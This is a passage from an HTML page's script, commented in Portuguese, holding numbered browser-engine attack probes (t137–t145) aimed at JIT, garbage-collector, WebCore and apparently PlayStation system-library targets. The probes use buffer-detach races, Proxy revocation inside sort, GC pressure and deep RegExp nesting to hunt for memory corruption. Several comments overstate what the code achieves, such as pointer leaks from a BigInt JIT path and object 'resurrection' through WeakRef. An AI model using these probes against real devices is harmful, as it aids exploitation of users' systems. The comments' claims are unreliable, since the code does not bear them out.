            worker.terminate();
            // Tenta acordar a thread morta
            Atomics.notify(int32, 0, 1);
            log.innerText += "\n[+] Futex Wait/Kill executado.";
        }, 50);
    }

    // =================================================================
    // 137. BigInt to Int32 JIT Truncation Bug
    // Alvo: JIT Compiler (Integer Representation)
    // Técnica: Confundir o JIT sobre conversão de BigInt para Int32.
    // Se o compilador otimizar a conversão incorretamente, pode tratar um BigInt (ponteiro)
    // como um inteiro imediato, causando vazamento de ponteiro.
    // =================================================================
    function t137() {
        const big = 1234567890123456789n;
        
        function opt(b) {
            // Operação bitwise força conversão para Int32
            return Number(b & 0xFFFFFFFFn); 
        }
        
        for(let i=0; i<10000; i++) opt(big);
        
        // Tenta passar um objeto que imita BigInt via valueOf
        const fake = {
            valueOf: () => {
                keeper.push(new ArrayBuffer(1024)); // GC Pressure
                return 1n;
            }
        };
        
        try {
            opt(fake);
            log.innerText += "\n[+] BigInt JIT path testado.";
        } catch(e) {
            log.innerText += "\n[+] Erro: " + e.message;
        }
    }

    // =================================================================
    // 138. Intl.NumberFormat Getter Mutation
    // Alvo: libSceLibcInternal (Formatting Buffer)
    // Técnica: Intl chama `valueOf` ou getters do número. Se alterarmos o objeto
    // durante a formatação, a libc pode ler memória inválida.
    // =================================================================
    function t138() {
        const fmt = new Intl.NumberFormat('en-US');
        const evil = {
            valueOf: function() {
                // Tenta invalidar o próprio objeto 'fmt' se possível
                // ou apenas causar pressão no heap
                keeper.push(new Uint8Array(1024 * 1024));
                return 123;
            }
        };
        
        try {
            fmt.format(evil);
            log.innerText += "\n[+] Intl Format sobrevivel.";
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 139. Array.sort Proxy Revocation Crash
    // Alvo: JavaScriptCore Array Operations
    // Técnica: Usar um Proxy revogável como elemento do array.
    // Revogar o proxy dentro do comparador do sort. O motor tenta acessar
    // o proxy revogado internamente.
    // =================================================================
    function t139() {
        const {proxy, revoke} = Proxy.revocable({val: 1}, {});
        const arr = [proxy, proxy];
        
        try {
            arr.sort((a, b) => {
                revoke(); // BOOM
                return 0;
            });
        } catch(e) {
            log.innerText += "\n[+] Revoked Proxy access capturado.";
        }
        log.innerText += "\n[+] Sort Proxy Revoke testado.";
    }

    // =================================================================
    // 140. TextEncoder.encodeInto Detach Race
    // Alvo: WebCore TextEncoder
    // Técnica: `encodeInto` escreve diretamente em uma view.
    // Se a view for desanexada (buffer transfer) durante a escrita, crash.
    // Usamos um objeto string malicioso que desanexa o buffer quando lido.
    // =================================================================
    function t140() {
        const encoder = new TextEncoder();
        const buf = new Uint8Array(1024);
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        const evilStr = {
            toString: () => {
                // Transfere o buffer de destino
                worker.postMessage(buf.buffer, [buf.buffer]);
                return "PAYLOAD";
            }
        };
        
        try {
            encoder.encodeInto(evilStr, buf);
            log.innerText += "\n[+] EncodeInto detach tentado.";
        } catch(e) {
            log.innerText += "\n[+] Detach bloqueado: " + e.message;
        }
    }

    // =================================================================
    // 141. WeakRef Resurrection
    // Alvo: Garbage Collector (Mark & Sweep)
    // Técnica: Tentar acessar (deref) um objeto fraco no momento exato
    // em que ele está sendo finalizado. Isso é o clássico "Lazarus Object".
    // =================================================================
    function t141() {
        if (!window.WeakRef) { log.innerText += "\n[-] WeakRef ausente."; return; }

        let target = { id: 1 };
        const ref = new WeakRef(target);
        const registry = new FinalizationRegistry((heldValue) => {
            // O objeto está morrendo. Tenta trazê-lo de volta.
            const resurrected = ref.deref();
            if (resurrected) {
                log.innerText += "\n[CRITICAL] Objeto ressuscitado durante finalização!";
                keeper.push(resurrected);
            }
        });
        
        registry.register(target, "token");
        target = null; // Libera referência forte
        
        // Força GC agressivo
        setTimeout(() => {
            let j = [];
            for(let i=0; i<10000; i++) j.push(new Uint8Array(1024));
            log.innerText += "\n[+] GC Resurrection cycle initiated.";
        }, 100);
    }

    // =================================================================
    // 142. IPC MessagePort Recursive Transfer
    // Alvo: Kernel IPC Handles
    // Técnica: Criar uma cadeia profunda de portas transferindo umas às outras.
    // Tenta estourar a pilha de serialização do kernel ou esgotar handles.
    // =================================================================
    function t142() {
        let channel = new MessageChannel();
        let port = channel.port1;
        
        // Cria aninhamento
        for(let i=0; i<1000; i++) {
            const next = new MessageChannel();
            // Envia a porta atual pelo próximo canal
            next.port1.postMessage("nest", [port]);
            port = next.port2;
        }
        
        log.innerText += "\n[+] 1000 Ports nested transfer sent.";
    }

    // =================================================================
    // 143. RegExp Compiled Stack Frame Alignment
    // Alvo: JIT Generated Code
    // Técnica: RegExps aninhadas geram código de máquina recursivo.
    // Tentamos gerar um padrão cuja recursão alinhe perfeitamente com o fim da stack.
    // =================================================================
    function t143() {
        // Padrão que causa backtracking pesado
        const depth = 500;
        let p = "a";
        for(let i=0; i<depth; i++) p = `(${p})*`;
        
        try {
            const re = new RegExp(p);
            re.test("a".repeat(100));
            log.innerText += "\n[+] RegExp Stack Stress executado.";
        } catch(e) {
            log.innerText += "\n[+] Stack limit: " + e.message;
        }
    }

    // =================================================================
    // 144. SharedArrayBuffer Unaligned Cross-Page Read
    // Alvo: Memory Management Unit (MMU) / Hardware
    // Técnica: Ler um valor multi-byte (Float64) que cruza a fronteira de uma página (4KB).
    // Em arquiteturas específicas, isso pode causar falhas se não for atômico.
    // =================================================================
    function t144() {
        if (!window.SharedArrayBuffer) return;
        
        const sab = new SharedArrayBuffer(4096 * 2); // 2 páginas
        const view = new DataView(sab);
        
        // Offset crítico: último byte da página 0 + 7 bytes da página 1
        const offset = 4096 - 1; 
        
        try {
            const val = view.getFloat64(offset, true);
            log.innerText += "\n[+] Cross-page read: " + val;
        } catch(e) {
            log.innerText += "\n[!] Erro: " + e.message;
        }
    }

    // =================================================================
    // 145. FinalizationRegistry Registry Re-entrancy
    // Alvo: GC Logic
    // Técnica: Registrar um novo objeto no registro *dentro* do callback de limpeza
    // de outro objeto. Pode corromper a lista ligada interna do registro.
    // =================================================================
    function t145() {
        if (!window.FinalizationRegistry) return;

        const registry = new FinalizationRegistry((held) => {
            // Callback
            // AÇÃO: Registra novo objeto aqui dentro
            const fresh = {};
            registry.register(fresh, "recursive");
            // Solta fresh imediatamente para estressar
            log.innerText += "\n[+] Re-entrant Registration attempted.";
        });
        
        const o = {};
        registry.register(o, "init");
        
        // Trigger GC simulation
        keeper.push(new ArrayBuffer(1000));
    }

</script>
</body>
</html>
